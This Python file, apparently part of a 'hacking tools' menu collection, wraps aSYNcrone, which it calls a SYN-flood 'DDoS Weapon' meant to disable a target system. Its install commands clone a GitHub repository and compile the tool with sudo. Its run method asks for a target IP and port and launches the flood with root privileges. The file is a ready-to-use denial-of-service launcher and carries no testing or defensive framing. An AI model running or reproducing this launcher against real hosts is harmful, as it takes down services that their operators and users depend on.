# coding=utf-8
import subprocess

from core import HackingTool
from core import HackingToolsCollection

class Asyncrone(HackingTool):
    TITLE = "Asyncrone - Multifunction SYN Flood DDoS Weapon"
    DESCRIPTION = "aSYNcrone is a C language based, multifunction SYN Flood " \
                  "DDoS Weapon.\nDisable the destination system by sending a " \
                  "SYN packet intensively to the destination."
    INSTALL_COMMANDS = [
        "git clone https://github.com/fatih4842/aSYNcrone.git",
        "cd aSYNcrone; sudo gcc aSYNcrone.c -o aSYNcrone -lpthread"
    ]
    PROJECT_URL = "https://github.com/fatihsnsy/aSYNcrone"

    def run(self):
        source_port = input("Enter Source Port >> ")
        target_ip = input("Enter Target IP >> ")
        target_port = input("Enter Target port >> ")
        try:
            subprocess.run([
                "sudo", "./aSYNcrone", source_port, target_ip, target_port, "1000"
            ], cwd="aSYNcrone", check=True)
            print("Command executed successfully.")
        except subprocess.CalledProcessError:
            print("Failed to execute the command.")
        except Exception as e:
            print(f"An unexpected error occurred: {str(e)}")

class DDOSTools(HackingToolsCollection):
    TITLE = "DDOS Attack Tools"
    TOOLS = [
        Asyncrone(),
    ]
